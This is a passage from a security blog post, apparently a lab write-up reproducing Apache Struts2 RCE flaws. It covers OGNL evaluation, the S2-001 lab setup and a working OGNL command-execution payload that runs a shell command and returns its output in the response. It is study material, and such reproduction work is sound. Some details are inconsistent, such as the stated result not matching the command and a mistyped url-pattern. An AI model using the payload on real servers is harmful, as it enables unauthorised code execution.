@@ -1,0 +1,827 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog,blog,reader-l,&#34;读者&#34;,&#34;reader-l web安全&#34;,&#34;攻防&#34;">
+  <title>Struts2漏洞复现合集 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Struts2漏洞复现合集">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-06-29 09:09" pubdate>
+        2021年6月29日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      102
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Struts2漏洞复现合集</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年7月4日 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    最近在学习JAVA安全，所以部分JAVA的相关框架漏洞自然就是我学习的重中之重，近几年Struts2各种RCE的漏洞频出。因此我也得抓住时机好好学习。我会陆陆续续将所有struts2 RCE漏洞都复现分析一遍。</p>
+<p>​    <code>OGNL</code>（<code>Object-Graph Navigation Language</code>，对象图导航语言），可以通过简单的表达式来访问Java对象中的属性。它是<code>Struts2</code>框架的默认表达式语言。假设在Action中有一个属性类型是对象Student(name, age)，变量名是<code>stu</code>，那么访问属性name的<code>OGNL</code>表达式为<code>stu.name</code>。</p>
+<h2 id="漏洞原理简介"><a href="#漏洞原理简介" class="headerlink" title="漏洞原理简介"></a>漏洞原理简介</h2><p>ognl表达式的getValue函数本身具有执行java代码的能力，最基础的形式如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo;<br><br><span class="hljs-keyword">import</span> ognl.Ognl;<br><span class="hljs-keyword">import</span> ognl.OgnlContext;<br><span class="hljs-keyword">import</span> ognl.OgnlException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ognlExp</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> OgnlException </span>&#123;<br>            OgnlContext context = <span class="hljs-keyword">new</span> OgnlContext();<br>            Object obj = Ognl.getValue(<span class="hljs-string">&quot;&#x27;helloworld&#x27;.length()&quot;</span>,context);<br>            System.out.println(obj);<br>            Object obj1 = Ognl.getValue(<span class="hljs-string">&quot;@java.lang.String@format(&#x27;foo %s&#x27;,&#x27;bar&#x27;)&quot;</span>,context);<br>            System.out.println(obj1);<br>            Object obj2 = Ognl.getValue(<span class="hljs-string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;)&quot;</span>,context);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>成功弹出计算器，这样我们可以知道只要<code>Ognl.getValue</code>的第一个参数是用户可以控制的，那就可以用来执行任意Java代码进而触发RCE。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/0.png" srcset="/img/loading.gif"></p>
+<p>同时<code>Ognl.setValue()</code>也是具有执行JAVA代码的能力的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo;<br><br><span class="hljs-keyword">import</span> ognl.Ognl;<br><span class="hljs-keyword">import</span> ognl.OgnlContext;<br><span class="hljs-keyword">import</span> ognl.OgnlException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ognlExp</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> OgnlException </span>&#123;<br>            OgnlContext context = <span class="hljs-keyword">new</span> OgnlContext();<br>            Object obj = Ognl.getValue(<span class="hljs-string">&quot;&#x27;helloworld&#x27;.length()&quot;</span>,context);<br>            System.out.println(obj);<br>            Object obj1 = Ognl.getValue(<span class="hljs-string">&quot;@java.lang.String@format(&#x27;foo %s&#x27;,&#x27;bar&#x27;)&quot;</span>,context);<br>            System.out.println(obj1);<br><span class="hljs-comment">//            Object obj2 = Ognl.getValue(&quot;@java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;)&quot;,context);</span><br>            Ognl.setValue(<span class="hljs-string">&quot;(@java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;))(reader-l)(amadeus)&quot;</span>,context,<span class="hljs-string">&quot;&quot;</span>);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>成功弹出计算器。</p>
+<blockquote>
+<p>​    看一下这个ognl的表达式，表面上去看上去是有点诡异的，在我们上面的getValue的exp后面多了个(reader-l)(amadeus)，关于ognl对上面这串表达式的执行流程是，ognl首先对(&quot;@java.lang.Runtime@getRuntime().exec(&#39;open /Applications/Calculator.app/&#39;)&quot;)(glassy)当做表达式进行计算，这个表达式返回了带有payload的ASTEval树，然后以amadeus为root再对这个AST树进行计算，从而造成了RCE.</p>
+</blockquote>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/-1.png" srcset="/img/loading.gif"></p>
+<h1 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h1><h2 id="1-Struts2-001"><a href="#1-Struts2-001" class="headerlink" title="1.Struts2-001"></a>1.Struts2-001</h2><h3 id="1-漏洞概要："><a href="#1-漏洞概要：" class="headerlink" title="1.漏洞概要："></a>1.漏洞概要：</h3><p>Struts2-001是一个远程代码执行漏洞</p>
+<p>漏洞影响版本： <code>Struts 2.0.0 - Struts 2.0.8</code> 。更多详情可参考官方通告：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
+<h3 id="2-漏洞环境搭建"><a href="#2-漏洞环境搭建" class="headerlink" title="2.漏洞环境搭建"></a>2.漏洞环境搭建</h3><p>Tomcat 8.5.64 + Struts2.0.8</p>
+<p>审计环境：IDEA2021</p>
+<p>利用IDEA自带的创建struts2的模块来进行搭建</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/1.png" srcset="/img/loading.gif"></p>
+<p>创建完毕后，就要把struts2的库加载到项目中（记得去掉一些不必要的库，否则会导致项目运行失败！！）</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/2.png" srcset="/img/loading.gif"></p>
+<p>其中漏洞复现中必要的文件如下：</p>
+<p>web.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/`<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>struts.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;struts-default.xml&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;default&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;action.LoginAction&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+<p>index.jsp（前端恶意代码入口）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: reader-l<br>  Date: <span class="hljs-number">2021</span>/<span class="hljs-number">6</span>/<span class="hljs-number">30</span><br>  Time: 上午<span class="hljs-number">8</span>:<span class="hljs-number">52</span><br>  To change <span class="hljs-keyword">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;s&quot;</span> uri=<span class="hljs-string">&quot;/struts-tags&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;title&gt;用户登录&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;用户登录&lt;/h1&gt;<br>&lt;s:form action=<span class="hljs-string">&quot;login&quot;</span>&gt;<br>  &lt;s:textfield name=<span class="hljs-string">&quot;username&quot;</span> label=<span class="hljs-string">&quot;username&quot;</span> /&gt;<br>  &lt;s:textfield name=<span class="hljs-string">&quot;password&quot;</span> label=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>  &lt;s:submit&gt;&lt;/s:submit&gt;<br>&lt;/s:form&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+<p>以及action类 （LoginAction）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> action;<br><br><span class="hljs-keyword">import</span> bean.User;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> User user;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String password;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">getUser</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> user;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUser</span><span class="hljs-params">(User user)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.user = user;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String username = <span class="hljs-keyword">this</span>.username;<br>        String password = <span class="hljs-keyword">this</span>.password;<br>        System.out.println(<span class="hljs-string">&quot;用户名:&quot;</span>+username+<span class="hljs-string">&quot;密码:&quot;</span>+password);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>JavaBean</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> bean;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String password;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(String username, String password)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>        <span class="hljs-keyword">this</span>.password = password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.password = password;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>项目结构如下：</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/3.png" srcset="/img/loading.gif"></p>
+<h3 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h3><p>在index.jsp的输入框中填写该poc：<code>%&#123;1+1&#125;</code></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/4.png" srcset="/img/loading.gif"></p>
+<p>成功得到计算结果：</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/5.png" srcset="/img/loading.gif"></p>
+<p>命令执行EXP:</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">%&#123;#a=(<span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">ProcessBuilder(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">lang</span>.String[]&#123;<span class="hljs-string">&quot;ifconfig&quot;</span>&#125;)</span>).redirect<span class="hljs-constructor">ErrorStream(<span class="hljs-params">true</span>)</span>.start<span class="hljs-literal">()</span>,#b=#a.get<span class="hljs-constructor">InputStream()</span>,#c=<span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">InputStreamReader(#<span class="hljs-params">b</span>)</span>,#d=<span class="hljs-keyword">new</span> java.io.<span class="hljs-constructor">BufferedReader(#<span class="hljs-params">c</span>)</span>,#e=<span class="hljs-keyword">new</span> <span class="hljs-built_in">char</span><span class="hljs-literal">[<span class="hljs-number">50000</span>]</span>,#d.read(#e),#f=#context.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.get<span class="hljs-constructor">Writer()</span>.println(<span class="hljs-keyword">new</span> java.lang.<span class="hljs-constructor">String(#<span class="hljs-params">e</span>)</span>),#f.get<span class="hljs-constructor">Writer()</span>.flush<span class="hljs-literal">()</span>,#f.get<span class="hljs-constructor">Writer()</span>.close<span class="hljs-literal">()</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>成功执行得到当前用户名</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/6.png" srcset="/img/loading.gif"></p>
